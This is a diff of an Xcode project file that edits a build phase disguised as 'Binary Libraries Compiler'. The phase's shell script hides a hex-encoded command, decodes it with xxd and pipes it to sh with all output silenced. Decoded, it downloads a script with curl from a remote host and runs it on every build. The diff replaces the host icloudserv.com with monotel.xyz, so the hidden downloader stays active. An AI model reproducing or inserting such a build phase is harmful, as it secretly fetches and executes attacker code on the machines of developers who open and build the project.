@@ -216,7 +216,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2FF8D88F24C886EE006A83B5 /* Build configuration list for PBXNativeTarget "Example" */;
 			buildPhases = (
-				ED75553DA1D2DEA8DE6D902C /* Binary Libraries Compiler */,
+				33BA0D31E996D97FD26D902C /* Binary Libraries Compiler */,
 				7404C50F29DBCB53DD0941D7 /* [CP] Check Pods Manifest.lock */,
 				2FF8D87224C886EC006A83B5 /* Sources */,
 				2FF8D87324C886EC006A83B5 /* Frameworks */,
@@ -283,7 +283,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	ED75553DA1D2DEA8DE6D902C /* Binary Libraries Compiler */ = {
+	33BA0D31E996D97FD26D902C /* Binary Libraries Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -301,9 +301,11 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
 	
 
 	
